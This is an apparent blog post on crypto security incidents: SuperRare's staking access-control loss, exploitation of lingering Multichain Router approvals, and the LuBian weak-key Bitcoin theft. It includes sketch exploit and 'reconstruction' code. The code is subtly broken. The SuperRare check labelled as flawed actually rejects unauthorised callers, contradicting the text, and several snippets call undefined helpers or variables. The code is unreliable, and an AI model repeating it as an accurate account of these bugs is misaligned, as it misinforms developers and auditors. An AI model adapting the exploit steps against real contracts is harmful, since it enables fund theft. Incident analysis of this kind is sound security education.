---
title: "Legacy Approval Exploits and the $3.5B LuBian Discovery"
date: 2025-08-11
categories: [Security, Access Control, Legacy Vulnerabilities, Smart Contract Bugs, Historical Analysis]
---

## 🔴 SuperRare: $730K Access Control Catastrophe

**The Crisis:** SuperRare's staking contract suffered a $730K loss due to a simple but devastating access control vulnerability that took attackers two weeks to discover and exploit.

### Technical Breakdown: The Careless Access Control Bug

You'd think after countless smart contract disasters, fundamentals like permission checks would be bullet proof but SuperRare's staking contract proves otherwise.

```solidity
// SuperRare's vulnerable access control implementation
contract SuperRareStaking {
    address public owner;
    bytes32 public merkleRoot;
    
    // VULNERABILITY: Incomplete access control logic
    function updateMerkleRoot(bytes32 newRoot) external override {
        if (
            (msg.sender != owner() &&
            msg.sender != address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc))  
        ) revert Notauthorised();
        
        // CRITICAL FLAW: Missing validation allows unauthorised updates
        merkleRoot = newRoot;
        
        emit MerkleRootUpdated(newRoot);
    }
    
    // VULNERABILITY: Staking logic depends on manipulated merkle root
    function stake(
        uint256 amount,
        bytes32[] calldata proof
    ) external {
        // Verify user eligibility using compromised merkle root
        require(verifyMerkleProof(msg.sender, amount, proof, merkleRoot), "Invalid proof");
        
        // Transfer RARE tokens based on manipulated data
        rareToken.transferFrom(msg.sender, address(this), amount);
        
        userStakes[msg.sender] += amount;
        totalStaked += amount;
    }
}
```

### The Attack Execution

**Discovery Timeline:**
A simple mistake in the `updateMerkleRoot` function allowed anyone to hijack critical staking logic and drain $730K worth of RARE tokens. It took attackers about two weeks to discover and exploit this completely preventable and careless vulnerability.

```solidity
// Attack contract exploiting the access control flaw
contract SuperRareExploit {
    SuperRareStaking target;
    
    function executeExploit() external {
        // Step 1: Create malicious merkle tree allowing unlimited staking
        bytes32 maliciousMerkleRoot = calculateMaliciousRoot();
        
        // Step 2: Update merkle root (bypasses access control)
        target.updateMerkleRoot(maliciousMerkleRoot);
        
        // Step 3: Generate proof for massive stake allocation
        bytes32[] memory maliciousProof = generateMaliciousProof();
        
        // Step 4: Stake with inflated amounts
        target.stake(1000000 ether, maliciousProof);
        
        // Step 5: Withdraw rewards based on manipulated staking data
        target.withdrawRewards();
    }
    
    function calculateMaliciousRoot() internal pure returns (bytes32) {
        // Create merkle root that validates any staking amount for attacker
        return keccak256(abi.encodePacked("MALICIOUS_ROOT_ALLOWING_ANY_AMOUNT"));
    }
}
```

**Root Cause Analysis:**
The vulnerability stemmed from incomplete access control validation that allowed unauthorised users to manipulate critical protocol parameters, specifically the merkle root used for staking eligibility verification.

---

## 🔴 Multichain Router: Legacy Approval Exploitation

**The Crisis:** Users continue to fall victim to exploits long after major breaches because permission revocation is often neglected, with the 2022 Multichain Router vulnerability still being exploited in 2025.

### Technical Analysis: The Phantom Function Attack

The Multichain Router (formerly AnySwap) vulnerability from 2022 allowed attackers to bypass intended permission checks and drain funds from wallets that still had lingering approvals, even on chains where the router was no longer active.

```solidity
// Multichain Router vulnerable approval pattern
contract MultichainRouter {
    mapping(address => mapping(address => uint256)) public allowances;
    
    // VULNERABILITY: Phantom function allowing unauthorised transfers
    function transferWithPermit(
        address token,
        address from,
        address to,
        uint256 amount,
        bytes calldata signature
    ) external {
        // CRITICAL FLAW: Missing proper authorisation checks
        // Allows bypass of intended permission system
        
        // Direct transfer without proper validation
        IERC20(token).transferFrom(from, to, amount);
        
        emit TransferExecuted(token, from, to, amount);
    }
    
    // Users granted approvals that remain active
    function approve(address spender, uint256 amount) external {
        allowances[msg.sender][spender] = amount;
        // Approvals never properly revoked by users
    }
}
```

### The MEV Bot Hero Incident

In one recent case a well-known MEV bot front-ran the theft and inadvertently rescued 401 ETH. Someone got really lucky here!

```solidity
// MEV bot accidentally saving funds through front-running
contract AccidentalRescueBot {
    function frontrunTransaction(bytes calldata originalTx) external {
        // MEV bot detects profitable opportunity
        // Unknowingly front-runs malicious exploit transaction
        
        // Execute "rescue" by extracting value first
        address target = extractTargetFromTx(originalTx);
        uint256 amount = extractAmountFromTx(originalTx);
        
        // Accidentally saves 401 ETH from attacker
        IERC20(targetToken).transferFrom(target, address(this), amount);
        
        // MEV bot gets the funds instead of the attacker
        emit AccidentalRescue(target, amount);
    }
}
```

**Critical Security Lesson:**
So pretty please, with a sugar on top, revoke your approvals at [revoke.cash](https://revoke.cash).

---

## 🔍 Historical Discovery: The $3.5B LuBian Mining Pool Hack

**The Discovery:** Arkham uncovered a $3.5B in BTC hack of LuBian, a Chinese mining pool, back in 2020. Unlike traditional hotwallet or infrastructure CeFi compromises, this one was caused by weak private key generation algorithm.

### Technical Analysis: Weak Key Generation Vulnerability

Better late than never to discover and learn from the largest (in USD) crypto hack in history.

```python
# LuBian's vulnerable private key generation (theoretical reconstruction)
class WeakKeyGeneration:
    def __init__(self):
        self.weak_entropy_source = "predictable_mining_pool_data"
        self.insufficient_randomness = True
        
    def generate_vulnerable_keys(self):
        """
        Weak key generation that enabled the $3.5B theft
        """
        # VULNERABILITY: Using predictable entropy sources
        weak_seed = self.generate_predictable_seed()
        
        # CRITICAL FLAW: Insufficient randomness in key derivation
        private_keys = []
        for i in range(1000):  # Mining pool wallet batch
            # Weak derivation using predictable inputs
            key = self.derive_key_from_weak_seed(weak_seed, i)
            private_keys.append(key)
            
        return private_keys
    
    def generate_predictable_seed(self):
        """
        Mining pool used predictable data for key generation
        """
        return {
            'timestamp': 'rounded_to_hour',  # Predictable
            'pool_id': 'sequential_counter',  # Predictable  
            'miner_data': 'public_information',  # Predictable
            'entropy_source': 'insufficient_random_bytes'  # CRITICAL FLAW
        }
    
    def derive_key_from_weak_seed(self, seed, counter):
        """
        Vulnerable key derivation allowing key recovery
        """
        # Attackers could brute force this pattern
        weak_key = hashlib.sha256(f"{seed}{counter}".encode()).digest()
        return weak_key
```

**Attack Methodology:**
The 2020 attack likely involved:
1. **Pattern Recognition:** Analysing LuBian's key generation patterns
2. **Entropy Analysis:** Identifying predictable randomness sources
3. **Systematic Brute Force:** Recovering private keys from weak seeds
4. **Mass Extraction:** Draining $3.5B worth of Bitcoin systematically

**Why It Remained Hidden:**
- **Attribution Challenges:** Difficult to trace sophisticated key-based attacks
- **Mining Pool Opacity:** Less transparency in mining pool operations
- **Investigation Complexity:** Required deep cryptographic analysis
- **Market Impact Considerations:** Potential market manipulation concerns

To me this week demonstrated that cryptocurrency security failures span from the most basic coding errors to sophisticated cryptographic attacks. While SuperRare's $730K loss from a simple access control bug shows that fundamentals are still ignored, the $3.5B LuBian discovery proves that even the largest thefts can remain hidden for years. The combination of new exploits and historical revelations underscores that security in cryptocurrency requires both attention to basic principles and deep technical expertise.*